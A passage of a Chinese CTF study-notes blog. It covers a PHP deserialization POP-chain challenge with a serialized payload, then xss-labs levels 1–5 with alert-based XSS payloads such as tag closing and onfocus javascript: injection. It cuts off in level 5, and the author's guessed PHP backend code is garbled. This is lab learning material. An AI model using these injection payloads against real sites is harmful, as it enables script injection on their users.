‘Getflag’。<br>因此，w44m 的 Getflag 方法会被调用。  </p><h2 id="我的理解是：整个构造的最终目的是为了执行-w44m-类中的-Getflag-方法"><a href="#我的理解是：整个构造的最终目的是为了执行-w44m-类中的-Getflag-方法" class="headerlink" title="我的理解是：整个构造的最终目的是为了执行 w44m 类中的 Getflag 方法  "></a>我的理解是：整个构造的最终目的是为了执行 w44m 类中的 Getflag 方法  </h2><blockquote><p>对于__toString()，要求是在它类里的变量被实例化时才会被触发。所以$p-&gt;w00m &#x3D; new w33m();则不会触发__toString()。而后面$a-&gt;w00m-&gt;w00m&#x3D;new w44m();语句为w33m类中的变量实例化后，才能使_toString()方法可被调用，进一步让$a-&gt;w00m-&gt;w22m&#x3D;’Getflag’;语句生效。</p></blockquote><blockquote><p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错。</p></blockquote><p>这是我猜测后端代码接收到传入后的样子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> (w00m)<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> (<span class="hljs-title">w00m</span>)<span class="hljs-title">w44m</span></span>&#123;<br><br>            <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>            <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>        <br>            <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        <span class="hljs-keyword">public</span> (w22m)<span class="hljs-string">&#x27;Getflag&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><br><br><br>\</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>&#123;$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>w22m&#125;();<br></code></pre></td></tr></table></figure><p>q:  </p><blockquote><p>的意思是让将w22m的值作为参数输入w00m吗</p></blockquote><p>kimi:</p><blockquote><p>不是的,例如，如果 $this-&gt;w22m 的值是 ‘Getflag’，那么这行代码就相当于 $this-&gt;w00m-&gt;Getflag()。 </p></blockquote><p>q:</p><blockquote><p>那就是执行w00m中的getflag()？</p></blockquote><p>kimi:</p><blockquote><p>是的，这行代码的意思是执行 $this-&gt;w00m 对象中的 Getflag() 方法</p></blockquote><h2 id="那么我看总的意思是："><a href="#那么我看总的意思是：" class="headerlink" title="那么我看总的意思是："></a>那么我看总的意思是：</h2><p>将w22m中的w00m赋值为w33m的类<br>再将w22m中w00m（现已为w33m类）的w00m赋值为w44m的类<br>最后将w22m中的w00m（现已为w33m类）中的w22m赋值为‘GetFlag’<br>最后由于__toString()函数，会将改类下的w22m的值作为w44m中的的元素执行，那结果就是执行w44m中的Getflag<br>输出flag</p><p>wp作者：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">$a=new w22m();<span class="hljs-comment">//这段代码说明我们将w22m类赋值给a，现在可以将$a看做w22m类,所以现在$a中有一个属性w00m</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span>w00m=new w33m();<span class="hljs-comment">//将w22m中的w00m属性调用（指向）w33m类：现在w22m中w00m属性有w33类中w00m和w22m两个属性。</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w00m=new w44m();<span class="hljs-comment">//w22m类中w00m属性调用了w44m类</span><br><br>$<span class="hljs-function"><span class="hljs-title">a</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">w00m</span>-&gt;</span>w22m=<span class="hljs-string">&#x27;Getflag&#x27;</span>;<span class="hljs-comment">//使用了w44m类中的Getflag方法，()在w33m中_toString()方法被调用。</span><br>最后的效果就是在w44m中执行了Getflag()整个方法，输出了$flag的值。<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/u010723806/article/details/142340216">https://blog.csdn.net/u010723806/article/details/142340216</a></p><p>最后payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w33m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w00m&quot;</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;w44madmin&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w44m&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;*passwd&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;08067&quot;</span>;&#125;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;w22m&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;Getflag&quot;</span>;&#125;&#125;<br></code></pre></td></tr></table></figure><p>传入要型url编码，</p><blockquote><p>当我们传递的参数中含有private变量时，一定要url编码一下，否则会有不可见字符导致解析出错</p></blockquote><hr><h2 id="title-xss-labs-studynotesdate-2025-10-01-01-59-18tags"><a href="#title-xss-labs-studynotesdate-2025-10-01-01-59-18tags" class="headerlink" title="title: xss-labs-studynotesdate: 2025-10-01 01:59:18tags:"></a>title: xss-labs-studynotes<br>date: 2025-10-01 01:59:18<br>tags:</h2><h1 id="打一下xss-labs"><a href="#打一下xss-labs" class="headerlink" title="打一下xss-labs"></a>打一下xss-labs</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>可以直接用payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;1&quot;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>自己没试出来，去网上找payload，发现<strong>闭合型标签</strong>注入可用：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>源码：   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level3.php?writing=wait&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level2&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>分析一下源码，先是有htmlspcialchar来进行转义特殊字符，但是在下面的.$str.没有，所以也不需要考虑绕过<br>如果插入：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p>会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input name=keyword  value=<span class="hljs-string">&quot;&#x27;&quot;</span>&gt;&lt;script&gt;<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>这里是先闭合了双引号，再闭合了input的尖括号，最后的script就变成了新元素执行了  </p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>先尝试：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script&gt;<span class="hljs-title function_">aler</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>查看返回页面原码：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level4.php?keyword=try harder!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(<span class="hljs-symbol">&amp;quot;</span>1<span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:27<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>全都进行了转义，<br>学习了网上的 onfocus事件绕过<br>在不需要&lt;&gt;的情况下完成绕过，大概就是在用户触发onfocus时会调用 onfocus&#x3D;”myFuncuntion()” 里的myFuncuntion,但是面对未知源码的网站我们不知道有什么确切的函数<br>所以使用JavaScript伪协议进行绕过，<br>JavaScript 协议（javascript:）是一种特殊的 URL 协议，用于在浏览器中直接执行 JavaScript 代码   </p><p>示例用法：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;Hello, World!&#x27;</span>);<br></code></pre></td></tr></table></figure><p>所以构造payload:  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&#x27; onfocus=javascript:alert(&#x27;</span><span class="hljs-variable constant_">XSS</span><span class="hljs-string">&#x27;) &#x27;</span><br><br>这时候：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;114514&#x27;</span>&gt;<br><br>会变成：  <br><br>&lt;input name=keyword  value=<span class="hljs-string">&#x27;finish&#x27;</span> onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;XSS&#x27;</span>) <span class="hljs-string">&#x27;&#x27;</span>&gt;<br><br>这时候点击输入框触发onfocus就能执行<br></code></pre></td></tr></table></figure><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>先查看一下页面源码：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和114514相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114514&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:6<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>注意到与level 3 只是 单引号 变成了 双引号   </p><p>遂构造：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">finish<span class="hljs-string">&quot; onfocus=javascript:alert(&#x27;XSS&#x27;) &quot;</span><br></code></pre></td></tr></table></figure><p>完成挑战  </p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>先看一下前端：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和find a way out!相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;find a way out!&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:15<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>怎么感觉，和上一关一样啊？<br>但是：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 